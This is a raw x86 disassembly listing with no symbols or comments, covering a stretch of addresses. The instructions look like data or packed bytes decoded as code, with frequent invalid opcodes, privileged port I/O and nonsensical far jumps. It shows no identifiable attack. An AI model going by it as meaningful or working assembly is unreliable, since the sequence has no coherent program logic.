  422fef:	vaddss xmm7,xmm2,xmm3
  422ff3:	jg     0x422f85
  422ff5:	inc    ecx
  422ff6:	rcr    ebp,cl
  422ff8:	lahf   
  422ff9:	mov    eax,0x1b59f1ab
  422ffe:	jp     0x423023
  423000:	push   esp
  423001:	sub    al,0xc2
  423003:	and    edi,DWORD PTR [edi+ebx*1+0x19d010b9]
  42300a:	xchg   edx,eax
  42300b:	sub    BYTE PTR [ebx+0x55],cl
  42300e:	mov    al,0x95
  423010:	xchg   esp,eax
  423011:	pop    eax
  423012:	mov    ch,0x74
  423014:	dec    esi
  423015:	mov    ebp,0x367039c
  42301a:	or     bh,cl
  42301c:	add    DWORD PTR [eax-0x66],edi
  42301f:	in     al,0x78
  423021:	loopne 0x422faf
  423023:	mov    cl,0xbf
  423025:	sub    esp,DWORD PTR [ecx+0x6d]
  423028:	mov    eax,0x3ced8bb2
  42302d:	inc    ebx
  42302f:	mov    ebx,DWORD PTR [edx+0x3d90ab0a]
  423035:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423036:	adc    dl,BYTE PTR ds:0xea596e94
  42303c:	cmp    eax,0x4de1f58e
  423041:	lock pop ecx
  423043:	jo     0x422fcd
  423045:	fidivr WORD PTR [ebx-0x390e2822]
  42304b:	pop    ebp
  42304c:	sbb    bl,0x87
  42304f:	mov    bh,0x3c
  423051:	xchg   edx,eax
  423052:	loope  0x423062
  423054:	retf   
  423055:	jg     0x423081
  423057:	push   ebx
  423058:	leave  
  423059:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42305a:	dec    eax
  42305b:	in     eax,0xb6
  42305d:	rcr    DWORD PTR [edi+ebp*2],1
  423060:	jge    0x423042
  423062:	dec    esi
  423063:	xor    eax,0xd64e70be
  423068:	loopne 0x423060
  42306a:	out    0x9,al
  42306c:	push   ds
  42306d:	or     eax,0xfc93f999
  423072:	mov    dl,0x9a
  423074:	mov    ecx,DWORD PTR [ebx+ebx*4+0x6]
  423078:	and    eax,0x32b1a47a
  42307d:	xor    dh,bh
  42307f:	fst    DWORD PTR [esi]
  423081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423082:	xor    al,0x7b
  423084:	push   edi
  423085:	jg     0x4230bf
  423087:	pop    ss
  423088:	lea    edx,[ebx+0x7a]
  42308b:	jns    0x42304e
  42308d:	fsubr  st(3),st
  42308f:	and    bh,BYTE PTR [edx]
  423091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423092:	mov    dl,0xac
  423094:	inc    esi
  423095:	or     dl,cl
  423097:	xor    al,0xd5
  423099:	jae    0x4230a7
  42309b:	xchg   bh,bh
  42309d:	mov    eax,0x39f80829
  4230a2:	inc    edi
  4230a3:	mov    eax,ds:0x1a4ca25b
  4230a8:	mov    cl,BYTE PTR [edx*8-0x15d7de73]
  4230af:	ficomp DWORD PTR [ebp+0x23]
  4230b2:	adc    edx,ebx
  4230b4:	lods   al,BYTE PTR ds:[esi]
  4230b5:	mov    eax,0xb3b3418a
  4230ba:	add    bh,al
  4230bc:	shl    BYTE PTR [eax+0x1e],0xdd
  4230c0:	sar    DWORD PTR [edi-0x15e7ecf8],cl
  4230c6:	lods   eax,DWORD PTR ds:[esi]
  4230c7:	xchg   edi,eax
  4230c8:	mov    esp,0xa19d0f46
  4230cd:	push   ss
  4230ce:	pop    eax
  4230cf:	cmp    eax,0x6ab57b2c
  4230d4:	(bad)  
  4230d5:	fwait
  4230d6:	aas    
  4230d7:	shl    BYTE PTR [edx],0x7a
  4230da:	sti    
  4230db:	fs adc al,0x5d
  4230de:	int3   
  4230df:	mov    eax,ds:0xcab0a390
  4230e4:	ss mov ebx,0x7aaee945
  4230ea:	in     eax,dx
  4230eb:	xor    eax,0x31b13a86
  4230f0:	and    al,0xdc
  4230f3:	pop    ds
  4230f4:	ja     0x42309c
  4230f6:	jns    0x4230f1
  4230f8:	push   ss
  4230f9:	add    esp,DWORD PTR [esi]
  4230fb:	and    BYTE PTR [eax+0x28],dl
  4230fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230ff:	call   0x5aec4026
  423104:	mov    ds:0x4a12e5a3,eax
  423109:	aam    0x4e
	...
  423127:	add    BYTE PTR [eax],al
  423129:	add    BYTE PTR [eax+0x4e],dl
  42312c:	dec    edi
  42312d:	push   esi
  42312e:	pop    edi
  42312f:	push   edi
  423130:	pop    ecx
  423131:	dec    esi
  423132:	idiv   BYTE PTR [ebx+0x53]
  423135:	jns    0x4230f1
  423137:	outs   dx,BYTE PTR ds:[esi]
  423138:	inc    edi
  423139:	dec    ecx
  42313a:	stos   BYTE PTR es:[edi],al
  42313b:	mov    esi,0x6890001
  423140:	add    BYTE PTR [eax],al
  423142:	push   ss
  423143:	rol    dl,0x68
  423146:	imul   edi,DWORD PTR [ecx+edx*1],0xfc3aef96
  42314d:	sub    ebp,DWORD PTR [esi+0x72]
  423150:	out    dx,eax
  423151:	cmp    DWORD PTR [esi],esi
  423153:	mov    ah,0x81
  423155:	pop    ebx
  423156:	cmp    BYTE PTR [edx+0x4c5fb817],al
  42315c:	lock dec DWORD PTR [esi]
  42315f:	cmp    al,0xde
  423161:	dec    ebp
  423162:	cwde   
  423163:	and    ecx,DWORD PTR ds:[edx-0x41]
  423167:	cmp    eax,0x7294b695
  42316c:	inc    ebp
  42316d:	arpl   WORD PTR [ebp+0x544d25bb],dx
  423173:	push   edx
  423174:	mov    dh,0x6a
  423176:	xchg   esi,eax
  423177:	sub    bl,dl
  423179:	inc    esp
  42317a:	pslld  mm4,QWORD PTR [ebx+0x476b2b08]
  423181:	fwait
  423182:	call   0xa149:0xc202b697
  423189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42318a:	(bad)  
  42318c:	jne    0x423127
  42318e:	loop   0x423145
  423190:	sub    BYTE PTR [edi-0x1f],dh
  423193:	daa    
  423194:	dec    ebp
  423195:	push   0xffffffb2
  423197:	pushf  
  423198:	mov    edx,0xf41a6489
  42319d:	ret    
  42319e:	clc    
  42319f:	sbb    ebp,DWORD PTR [ebp+esi*4+0x79]
  4231a3:	out    dx,eax
  4231a4:	pop    ds
  4231a5:	in     eax,dx
  4231a6:	or     eax,edi
  4231a8:	loope  0x4231ac
  4231aa:	(bad)  
  4231ab:	push   ebx
  4231ac:	sbb    BYTE PTR [ebx+0x71],cl
  4231af:	mov    ds:0x51217a42,eax
  4231b4:	push   ss
  4231b5:	(bad)  
  4231b7:	or     ecx,esp
  4231b9:	lock push ecx
  4231bb:	jle    0x423149
  4231bd:	fidiv  DWORD PTR [ebp-0x60f0cb17]
  4231c3:	outs   dx,DWORD PTR ds:[esi]
  4231c4:	xchg   ebx,eax
  4231c5:	aad    0x2c
  4231c7:	dec    eax
  4231c8:	cli    
  4231c9:	or     esp,DWORD PTR [ecx]
  4231cb:	push   esp
  4231cc:	test   eax,0x6702e12a
  4231d1:	mov    cl,cl
  4231d3:	mov    edx,cs
  4231d5:	fs ret 
  4231d7:	mov    esi,0xa2800f04
  4231dc:	sbb    DWORD PTR [ebx],ebx
  4231de:	mov    ds:0x9f918a24,eax
  4231e3:	lock in eax,0xbf
  4231e6:	or     ebp,esp
  4231e8:	xchg   ebp,eax
  4231e9:	lahf   
  4231ea:	mov    eax,ds:0xa740a722
  4231ef:	jmp    esp
  4231f1:	inc    esi
  4231f2:	pop    edi
  4231f3:	xchg   esi,eax
  4231f4:	test   al,0xa3
  4231f6:	dec    edx
  4231f7:	jb     0x4231d9
  4231f9:	mov    ebp,0x4c42d9e7
  4231fe:	mov    dh,0x32
  423200:	rol    BYTE PTR [esi],1
  423202:	cli    
  423203:	das    
  423204:	hlt    
  423205:	cmc    
  423206:	adc    eax,0x3c54d208
  42320b:	dec    esp
  42320c:	mov    edx,0xe1a0d18e
  423211:	rcr    DWORD PTR [edi-0xc],cl
  423214:	ret    0xc1cb
  423217:	ss loopne 0x4231bf
  42321a:	retf   0x7cdd
  42321d:	fisttp DWORD PTR [edi+0x7da6be28]
  423223:	and    eax,0xdec1a4a5
  423228:	xchg   BYTE PTR [esi-0x3924ba80],ah
  42322e:	das    
  42322f:	mov    bl,BYTE PTR [ecx+eiz*2+0xc1e64c6]
  423236:	cdq    
  423237:	enter  0x22cb,0x7b
  42323b:	jnp    0x42327b
  42323d:	xor    BYTE PTR [ecx],bl
  42323f:	out    dx,al
  423240:	jl     0x423253
  423242:	fist   WORD PTR [edi]
  423244:	or     dl,BYTE PTR [ecx]
  423246:	scas   eax,DWORD PTR es:[edi]
  423247:	fisttp QWORD PTR [edi]
  423249:	ss std 
  42324b:	dec    esi
  42324c:	ffree  st(6)
  42324e:	test   al,0xb1
  423250:	lahf   
  423251:	jge    0x4232cd
  423253:	add    bl,BYTE PTR [edx-0x5247aba3]
  423259:	mov    al,0x33
  42325b:	jp     0x42321e
  42325d:	sub    eax,0xdf7e6ead
  423262:	push   esp
  423263:	sbb    cl,bh
  423265:	xchg   ecx,eax
  423266:	ret    
  423267:	addr16 ds push dx
  42326b:	push   ebx
  42326c:	cmp    bh,BYTE PTR [edx]
  42326e:	mov    al,0x24
  423270:	dec    eax
  423271:	sub    cl,BYTE PTR [edx+ebx*4]
  423274:	fscale 
  423276:	xor    edi,edx
  423278:	inc    edi
  423279:	ds iret 
  42327b:	sub    ecx,ebx
  42327d:	stc    
  42327e:	xchg   DWORD PTR [edx+edi*8],ebp
  423281:	adc    al,BYTE PTR [esi+0x6635212c]
  423287:	dec    ebp
  423288:	pop    ss
  423289:	in     eax,dx
  42328a:	iret   
  42328b:	call   0x53b16755
  423290:	les    ebx,FWORD PTR [ebp-0x73af7491]
  423296:	push   ss
  423297:	adc    DWORD PTR [esi-0x32],ebp
  42329a:	loop   0x4232e1
  42329c:	mov    ds:0x2f27880f,eax
  4232a1:	pop    ss
  4232a2:	add    dh,BYTE PTR [edi+0x502685a3]
  4232a8:	(bad)  
  4232a9:	mov    ds:0x233fad5f,eax
  4232ae:	ss scas eax,DWORD PTR es:[edi]
  4232b0:	mov    al,0x3a
  4232b2:	ror    DWORD PTR [esi-0x44],1
  4232b5:	mov    dl,BYTE PTR [esp+ebx*8]
  4232b8:	popa   
  4232b9:	mov    es,WORD PTR [esi-0x74]
  4232bc:	xor    dh,BYTE PTR [ebx+edi*2]
  4232bf:	add    BYTE PTR [esi],ah
  4232c1:	inc    eax
  4232c2:	push   esi
  4232c3:	ffree  st(0)
  4232c5:	cmp    BYTE PTR [edx-0xe55d76d],al
  4232cb:	test   eax,0xdcc5a8c6
  4232d0:	inc    edi
  4232d1:	out    dx,al
  4232d2:	fnstenv [ebp-0x235575e1]
  4232d8:	es inc esp
  4232da:	pushf  
  4232db:	mov    BYTE PTR [ebx],cl
  4232dd:	stos   BYTE PTR es:[edi],al
  4232de:	outs   dx,BYTE PTR ds:[esi]
  4232df:	retf   
  4232e0:	add    BYTE PTR [eax+0x41],ch
  4232e3:	neg    ah
  4232e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232e6:	(bad)  
  4232e8:	jnp    0x42333c
  4232ea:	inc    esp
  4232eb:	cmp    bh,ch
  4232ed:	sbb    edx,esi
  4232ef:	addr16 or edi,ebx
  4232f2:	pusha  
  4232f3:	lds    ebp,FWORD PTR [ebx-0x2cc5048f]
  4232f9:	(bad)  
  4232fa:	xor    edi,ebx
  4232fc:	ret    
  4232fd:	std    
  4232fe:	sub    BYTE PTR [ebp-0x73364e30],ch
  423304:	mov    dh,0x65
  423306:	rol    ah,1
  423308:	jbe    0x4232c0
  42330a:	jg     0x423343
  42330c:	nop
  42330d:	daa    
  42330e:	dec    edi
  42330f:	sti    
  423310:	jg     0x423364
  423312:	and    eax,0xa9b9a20a
  423317:	mov    ebp,0x2c5a5f04
  42331c:	ins    DWORD PTR es:[edi],dx
  42331d:	and    DWORD PTR [esi],esi
  42331f:	call   0x17dd:0xe4756a3e
  423326:	retf   0xcfe0
  423329:	stc    
  42332a:	push   eax
  42332b:	cdq    
  42332c:	sub    eax,esp
  42332e:	mov    cl,0xee
  423330:	jno    0x42332f
  423332:	fdiv   QWORD PTR [ecx+0x98d251b]
  423338:	imul   ecx,DWORD PTR [eax+0x4886694f],0x47c35dca
  423342:	mov    cl,0x48
  423344:	es sub al,0x28
  423347:	dec    edi
  423348:	stos   BYTE PTR es:[edi],al
  423349:	ds and ch,bh
  42334c:	push   ss
  42334d:	xchg   edi,ecx
  42334f:	jmp    0x331c:0xcac91b4c
  423356:	xchg   esi,eax
  423357:	sbb    al,0x78
  423359:	inc    eax
  42335a:	pop    ecx
  42335b:	out    0xae,al
  42335d:	ja     0x423378
  42335f:	cdq    
  423360:	inc    esi
  423361:	push   edx
  423362:	outs   dx,BYTE PTR ds:[esi]
  423363:	fstp   TBYTE PTR [edx+0xa9edad2]
  423369:	jmp    0x3276dbf9
  42336e:	loop   0x4232fc
  423370:	cmp    ebx,ebp
  423372:	dec    edi
  423373:	dec    ecx
  423374:	in     eax,0x36
  423376:	push   cs
  423377:	mov    cl,0x3
  423379:	iret   
  42337a:	sbb    eax,0xf4006b1f
  42337f:	js     0x423391
  423381:	add    ah,BYTE PTR ds:0xbb6cb40c
  423387:	adc    al,0x85
  423389:	aam    0xfb
  42338b:	add    al,BYTE PTR [ebp-0x4ba6c95b]
  423391:	leave  
  423392:	inc    esi
  423393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423394:	push   cs
  423395:	aaa    
  423396:	adc    eax,0x6baa8fb9
  42339b:	xor    eax,0xe9b1dcc0
  4233a0:	into   
  4233a1:	xchg   ebx,eax
  4233a3:	sub    edx,ebp
  4233a5:	ret    0x3c03
  4233a8:	mov    dl,0x70
  4233aa:	(bad)  
  4233ab:	jmp    0x643d:0x2f6d5aef
  4233b2:	dec    eax
  4233b3:	data16 fadd DWORD PTR [esi+edx*1-0x6a]
  4233b8:	lahf   
  4233b9:	inc    ebx
  4233ba:	xchg   DWORD PTR [edi+0x1142688f],eax
  4233c0:	pop    ebp
  4233c1:	ret    0x9cff
  4233c4:	push   ecx
  4233c5:	cmp    BYTE PTR [edi+ebp*1-0x7a],ah
  4233c9:	fs adc eax,0xab75dd69
  4233cf:	cmp    al,0xac
  4233d1:	sbb    dh,ah
  4233d3:	outs   dx,DWORD PTR ds:[esi]
  4233d4:	cld    
  4233d5:	fist   DWORD PTR ds:0x6c5dbf10
  4233db:	inc    esi
  4233dc:	mov    ebp,0xd16a0e9e
  4233e1:	xchg   edx,eax
  4233e2:	dec    edi
  4233e3:	and    al,0xc7
  4233e5:	xor    BYTE PTR [eax+edx*1+0x69dfa51],al
  4233ec:	and    edi,DWORD PTR [edx]
  4233ee:	mov    eax,0x754ff06a
  4233f3:	dec    esi
  4233f4:	(bad)
  4233f7:	pop    ds
  4233f8:	sub    ah,BYTE PTR [esi]
  4233fa:	lds    esi,FWORD PTR [ecx-0x74aaf7b1]
  423400:	mov    ch,0xf5
  423402:	or     eax,0x6ed5c58c
  423407:	sub    esi,DWORD PTR [edx-0x366c795d]
  42340d:	pop    ds
  42340e:	pop    ss
  42340f:	pop    ebx
  423410:	add    cl,ch
  423412:	ret    
  423413:	shr    BYTE PTR [edi+0x37],cl
  423416:	push   esp
  423417:	cli    
  423418:	sub    edx,ebp
  42341a:	adc    BYTE PTR [esi],bl
  42341c:	nop
  42341d:	mov    cl,0x8f
  42341f:	sub    al,0xff
  423421:	lods   al,BYTE PTR ds:[esi]
  423422:	cmp    dh,BYTE PTR ds:0x3c6cd493
  423428:	outs   dx,DWORD PTR ds:[esi]
  423429:	inc    ebx
  42342a:	aaa    
  42342b:	pop    es
  42342c:	xor    ebx,DWORD PTR [ebp+0x6537ede8]
  423432:	sbb    cl,BYTE PTR [edx-0x25]
  423435:	out    0x9a,eax
  423437:	je     0x4233be
  423439:	outs   dx,BYTE PTR ds:[esi]
  42343a:	adc    al,0xba
  42343c:	xor    ecx,DWORD PTR [ebp-0x4d5f81fb]
  423442:	es jbe 0x423418
  423445:	xor    DWORD PTR [ebx],edi
  423447:	int    0xd1
  423449:	(bad)  
  42344a:	sub    ah,dl
  42344c:	push   ss
  42344d:	mov    edx,0xbae21c5d
  423452:	les    esp,FWORD PTR [edx-0x10bb5904]
  423458:	xabort 0x67
  42345b:	cld    
  42345c:	test   DWORD PTR [edi*4+0x15df55fe],edx
  423463:	add    BYTE PTR [ebp+0x76],0xf9
  423467:	test   esi,esp
  423469:	aam    0x11
  42346b:	shl    BYTE PTR [edi+esi*2],0x25
  42346f:	(bad)  
  423470:	arpl   WORD PTR [esi],di
  423472:	out    0x13,al
  423474:	ret    0xa5af
  423477:	cwde   
  423478:	retf   0x2349
  42347b:	add    BYTE PTR [ebx-0x68a3119f],dh
  423481:	ret    0x3c3e
  423484:	out    dx,al
  423485:	or     al,0x3c
  423487:	push   0xf
  423489:	push   cs
  42348a:	es jbe 0x4234ac
  42348d:	fsubr  DWORD PTR [edx+0x1cbd1555]
  423493:	push   ebx
  423494:	sbb    bh,ah
  423496:	dec    ebp
  423497:	mov    dl,dh
  423499:	lods   al,BYTE PTR ds:[esi]
  42349a:	add    DWORD PTR [edi+edx*8],edx
  42349d:	mov    ecx,0x4f5652f8
  4234a2:	dec    edi
  4234a3:	es push ebp
  4234a5:	mov    ecx,0xab8dac6a
  4234aa:	(bad)  
  4234ab:	push   es
  4234ac:	mov    ds:0x2b30f5a6,al
  4234b1:	dec    ebp
  4234b2:	sub    esp,DWORD PTR [edi]
  4234b4:	fist   WORD PTR [ebp-0x70]
  4234b7:	nop
  4234b8:	mov    bh,0x6b
  4234ba:	push   esp
  4234bb:	fcomip st,st(4)
  4234bd:	add    eax,0xb168f37a
  4234c2:	jmp    0x5404:0x9c67099d
  4234c9:	cdq    
  4234ca:	dec    edx
  4234cb:	daa    
  4234cc:	mov    cl,0x58
  4234ce:	inc    edi
  4234cf:	test   BYTE PTR [edx+0x1b1bef29],ah
  4234d5:	loopne 0x423496
  4234d7:	cmp    BYTE PTR [ebp+0x4],cl
  4234da:	hlt    
  4234db:	pop    ds
  4234dc:	dec    esi
  4234dd:	fucom  st(2)
  4234df:	mov    BYTE PTR [edi+eax*8-0x28c80509],0xe8
  4234e7:	inc    esp
  4234e8:	out    dx,al
  4234e9:	push   edx
  4234ea:	cmp    ah,bl
  4234ec:	popf   
  4234ed:	sar    DWORD PTR [edx],cl
  4234ef:	push   edi
  4234f0:	jno    0x42355b
  4234f2:	ins    BYTE PTR es:[edi],dx
  4234f3:	sub    DWORD PTR [ecx+0x38907a76],ebp
  4234f9:	test   ch,0xca
  4234fc:	arpl   bp,si
  4234fe:	aas    
  4234ff:	mov    eax,ds:0x15377c32
  423504:	inc    ebx
  423505:	push   ebp
  423506:	test   DWORD PTR ds:0xa2879cc1,esi
  42350c:	int    0x8a
  42350e:	mov    dl,0xbd
  423510:	lock pop ebx
  423512:	sbb    dh,BYTE PTR [ebp-0x1d]
  423515:	and    ebp,0xb0f8b70
  42351b:	mov    bl,BYTE PTR [ebx]
  42351d:	xchg   edx,eax
  42351e:	into   
  42351f:	pop    ds
  423520:	(bad)  
  423521:	retf   0xf9ad
  423524:	test   eax,0xcee755e2
  423529:	xchg   edx,eax
  42352a:	das    
  42352b:	or     ah,BYTE PTR [esi+0x6]
  42352e:	push   ds
  42352f:	lods   eax,DWORD PTR ds:[esi]
  423530:	or     eax,0x6a5d5da9
  423535:	xchg   ecx,eax
  423536:	(bad)  
  423537:	popa   
  423538:	or     DWORD PTR [edi+0x413c128f],0xffffff8f
  42353f:	inc    edx
  423540:	sbb    ah,BYTE PTR [eax+ebx*1-0x59c0545a]
  423547:	fwait
  423548:	cwde   
  423549:	fdiv   DWORD PTR [ecx+ecx*2+0x60c89e38]
  423550:	pop    ebp
  423551:	(bad)  
  423552:	mov    ds:0xc20335b8,ax
  423558:	cdq    
  423559:	xchg   esp,eax
  42355a:	ds data16 stos BYTE PTR es:[edi],al
  42355d:	mov    ds:0x66927984,eax
  423562:	push   esi
  423563:	shl    DWORD PTR [esi],1
  423565:	xchg   ebp,eax
  423566:	data16 test BYTE PTR [ecx+0x608114e5],ch
  42356d:	pop    edi
  42356e:	pop    ebx
  42356f:	xchg   esi,eax
  423570:	mov    bh,0x29
  423572:	push   esi
  423573:	popa   
  423574:	jo     0x4235ec
  423576:	lods   eax,DWORD PTR ss:[esi]
  423578:	jl     0x423572
  42357a:	lea    edx,[esi-0xf]
  42357d:	inc    edi
  42357e:	ss jp  0x423517
  423581:	dec    ecx
  423582:	mov    ah,0xbb
  423584:	sbb    BYTE PTR [ebp-0x5dced5b1],ch
  42358a:	(bad)  [eax+0x2be6ff56]
  423590:	leave  
  423591:	or     BYTE PTR [edx-0x57],ch
  423594:	and    dh,al
  423596:	pop    eax
  423597:	mov    ah,0x75
  423599:	js     0x423521
  42359b:	ret    
  42359c:	push   ds
  42359d:	add    BYTE PTR [eax+edx*8-0x51],bl
  4235a1:	mov    ds:0xc10acaec,al
  4235a6:	jge    0x423612
  4235a8:	push   esp
  4235a9:	arpl   WORD PTR [ebx+edi*4+0x3e919d7e],bp
  4235b0:	mov    al,ds:0x5603c575
  4235b5:	inc    edx
  4235b6:	mov    eax,DWORD PTR [eax+0x3794d94a]
  4235bc:	test   eax,0xf475b0a
  4235c1:	dec    esi
  4235c2:	pop    ecx
  4235c3:	mov    edx,0xc94dc166
  4235c8:	lock iret 
  4235ca:	sub    al,0xdf
  4235cc:	add    edx,DWORD PTR [eax]
  4235ce:	loopne 0x423572
  4235d0:	cmc    
  4235d1:	jmp    0x423620
  4235d3:	cmp    ecx,DWORD PTR fs:[ebx-0xb494a2]
  4235da:	lods   al,BYTE PTR ds:[esi]
  4235db:	and    al,0x8f
  4235dd:	int3   
  4235de:	pushf  
  4235df:	push   ebx
  4235e0:	ds xor eax,0x50bb4134
  4235e6:	in     al,dx
  4235e7:	enter  0xa2ae,0x72
  4235eb:	xor    BYTE PTR [ecx],al
  4235ed:	nop
  4235ee:	(bad)
  4235f1:	loope  0x42364b
  4235f3:	adc    ch,BYTE PTR [ebp+0x7e4610b6]
  4235f9:	add    eax,0x2c035fbe
  4235fe:	ret    
  4235ff:	sbb    DWORD PTR [eax-0x4cbff391],eax
  423605:	jle    0x42363a
  423607:	mov    edi,ebx
  423609:	sub    dh,0xfa
  42360c:	cli    
  42360d:	jp     0x4235f9
  42360f:	aam    0x0
  423611:	push   edi
  423612:	add    dh,BYTE PTR [ebx+0x0]
  423615:	adc    eax,0xf0ae8ba0
  42361a:	push   0x37a26304
  42361f:	sbb    BYTE PTR ds:0x52e47304,bl
  423625:	imul   eax,DWORD PTR [ebx+eax*8+0x8443325],0x365c5624
  423630:	and    eax,0xbfd7b8bc
  423635:	mov    DWORD PTR [ecx+0x203ee4e9],eax
  42363b:	and    BYTE PTR [ebx+0x68],al
  42363e:	xlat   BYTE PTR ds:[ebx]
  42363f:	mov    ah,BYTE PTR fs:[ecx-0x598dfc99]
  423646:	or     dl,ah
  423648:	push   ebp
  423649:	mov    eax,ds:0x67aef918
  42364e:	sbb    ch,dh
  423650:	ins    DWORD PTR es:[edi],dx
  423651:	daa    
  423652:	jmp    0xb873:0xc3498292
  423659:	xchg   esp,eax
  42365a:	addr16 pop edx
  42365c:	cmp    ebp,DWORD PTR [ebp-0x26]
  42365f:	xor    ebx,DWORD PTR [eax-0x229a22e5]
  423665:	cmp    BYTE PTR [ecx],al
  423667:	repnz pop ss
  423669:	iret   
  42366a:	mov    ebp,DWORD PTR [ecx+ecx*8-0x6748f4c8]
  423671:	imul   edx,DWORD PTR [esi+0x63],0x2181fea4
  423678:	lahf   
  423679:	push   0x4d
  42367b:	lea    ecx,[ebx+0x2c07cc3c]
  423681:	lea    edi,[edx-0x2e0fe8b5]
  423687:	mov    gs,WORD PTR [ecx]
  423689:	icebp  
  42368a:	gs jns 0x4236e9
  42368d:	inc    esp
  42368e:	sbb    eax,0xee2f4729
  423693:	push   ebp
  423694:	cmp    al,0x98
  423696:	pop    ebp
  423697:	cwde   
  423698:	push   ss
  423699:	xchg   ebp,eax
  42369a:	add    edi,DWORD PTR [esi]
  42369c:	(bad)  
  42369d:	mov    edi,0x6dd9ef8d
  4236a2:	sbb    eax,DWORD PTR [edx-0x16]
  4236a5:	retf   0x3922
  4236a8:	in     eax,dx
  4236a9:	loop   0x42368b
  4236ab:	pop    ss
  4236ac:	je     0x423673
  4236ae:	stos   DWORD PTR es:[edi],eax
  4236af:	cmc    
  4236b0:	icebp  
  4236b1:	push   0x3fc1d099
  4236b6:	cld    
  4236b7:	sbb    ebx,ecx
  4236b9:	mov    ch,0xd9
  4236bb:	dec    BYTE PTR [edx+0x63]
  4236be:	cwde   
  4236bf:	fsubr  QWORD PTR [ecx+0x656a4d62]
  4236c5:	popa   
  4236c6:	out    0x8e,eax
  4236c8:	xchg   esi,eax
  4236c9:	ja     0x42372f
  4236cb:	and    dh,dh
  4236cd:	std    
  4236ce:	push   ds
  4236cf:	adc    esp,eax
  4236d1:	scas   eax,DWORD PTR es:[edi]
  4236d2:	in     eax,0x7a
  4236d4:	push   0xbd221cfc
  4236d9:	jge    0x4236ea
  4236db:	test   BYTE PTR [edx-0x7b],dl
  4236de:	jbe    0x42370d
  4236e0:	dec    eax
  4236e1:	adc    BYTE PTR [edi-0x48],0x91
  4236e5:	xor    ah,BYTE PTR [eax+0x2]
  4236e8:	jno    0x423742
  4236ea:	icebp  
  4236eb:	pusha  
  4236ec:	sbb    al,0xef
  4236ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236ef:	mov    cl,0xa5
  4236f1:	xor    DWORD PTR [edi+0x28fac8b5],ebx
  4236f7:	adc    al,0x7
  4236f9:	add    BYTE PTR [ebx],0x7e
  4236fc:	add    ch,BYTE PTR [edx+0x72]
  4236ff:	retf   
  423700:	test   BYTE PTR [ebx+0x46e410d0],ah
  423706:	outs   dx,DWORD PTR ds:[esi]
  423707:	fld    DWORD PTR [ebp-0x59]
  42370a:	sbb    DWORD PTR ds:0xdf3a86f1,eax
  423710:	jae    0x423787
  423712:	pop    ecx
  423713:	sbb    al,0x7c
  423715:	jne    0x4236ae
  423717:	pop    esp
  423718:	test   esi,ebx
  42371a:	and    al,0x4f
  42371c:	sti    
  42371d:	std    
  42371e:	out    0x81,eax
  423720:	inc    edx
  423721:	or     ah,cl
  423723:	stos   BYTE PTR es:[edi],al
  423724:	stos   BYTE PTR es:[edi],al
  423725:	mov    al,0x33
  423727:	scas   eax,DWORD PTR es:[edi]
  423728:	(bad)  [edx]
  42372a:	cli    
  42372b:	ins    DWORD PTR es:[edi],dx
  42372c:	dec    edi
  42372d:	cdq    
  42372e:	ret    0x34fb
  423731:	cmc    
  423732:	fldcw  WORD PTR [ecx+0x23]
  423735:	(bad)  
  423736:	jno    0x4237af
  423738:	ins    DWORD PTR es:[edi],dx
  423739:	pop    ds
  42373a:	or     DWORD PTR [ebp+0x6e],ebp
  42373d:	call   0xf47a146a
  423742:	or     DWORD PTR [edi],0xffffffd1
  423745:	stos   BYTE PTR es:[edi],al
  423746:	retf   0x676f
  423749:	jb     0x423751
  42374b:	hlt    
  42374c:	(bad)  
  42374d:	xor    DWORD PTR [edx+0x5f28c7fd],eax
  423753:	and    DWORD PTR [esp+ebx*2+0x6],esp
  423757:	clc    
  423758:	ds int 0x44
  42375b:	cdq    
  42375c:	jp     0x4236f2
  42375e:	daa    
  42375f:	les    edi,FWORD PTR [eax-0x563e56fa]
  423765:	call   0xb244389b
  42376a:	stos   DWORD PTR es:[edi],eax
  42376b:	jb     0x4236f3
  42376d:	shr    BYTE PTR [eax+0x40],1
  423770:	cmp    esi,DWORD PTR [edi-0x7ec9b512]
  423776:	rcl    DWORD PTR [edi],0xd6
  423779:	jno    0x42371a
  42377b:	and    al,BYTE PTR [edi-0xb]
  42377e:	dec    esp
  42377f:	mov    dl,0x6c
  423781:	jp     0x42374e
  423783:	push   edi
  423784:	fbstp  TBYTE PTR [esi]
  423786:	lods   al,BYTE PTR ds:[esi]
  423787:	xchg   edx,eax
  423788:	inc    ebp
  423789:	pop    ss
  42378a:	cmp    al,0x37
  42378d:	sbb    eax,0x3d1a29ac
  423792:	sbb    dh,BYTE PTR ds:0x31da77fe
  423798:	scas   eax,DWORD PTR es:[edi]
  423799:	sub    DWORD PTR [edi+0x38],ecx
  42379c:	je     0x4237b4
  42379e:	cs inc ecx
  4237a0:	lods   al,BYTE PTR ds:[esi]
  4237a1:	jns    0x4237bf
  4237a3:	mov    al,ds:0x2a55be95
  4237a8:	and    bh,al
  4237aa:	in     eax,0xc7
  4237ac:	fimul  DWORD PTR [ecx]
  4237ae:	mov    ebp,0x51d673f9
  4237b3:	clc    
  4237b4:	jge    0x42381d
  4237b6:	push   ebp
  4237b7:	int    0xa5
  4237b9:	das    
  4237ba:	fwait
  4237bb:	pusha  
  4237bc:	daa    
  4237bd:	in     eax,dx
  4237be:	and    eax,esp
  4237c0:	or     BYTE PTR [ecx],al
  4237c2:	daa    
  4237c3:	ret    0xeee2
  4237c6:	ror    BYTE PTR [eax+0xc2fff2],1
	...
  4237e8:	add    BYTE PTR [eax],al
  4237ea:	pop    eax
  4237eb:	pop    ecx
  4237ec:	dec    ebx
  4237ed:	push   ebp
  4237ee:	dec    ebx
  4237ef:	push   edi
  4237f0:	pop    esi
  4237f1:	pop    ebp
  4237f2:	mov    ebx,0xd5a42923
  4237f7:	lds    edi,FWORD PTR [esi+0x7f]
  4237fa:	xor    eax,ebp
  4237fc:	add    DWORD PTR [eax],eax
  4237fe:	mov    DWORD PTR [esi],eax
  423800:	add    BYTE PTR [eax],al
  423802:	shl    DWORD PTR [esi],1
  423804:	xor    DWORD PTR [ebp-0x5a],0xdf119824
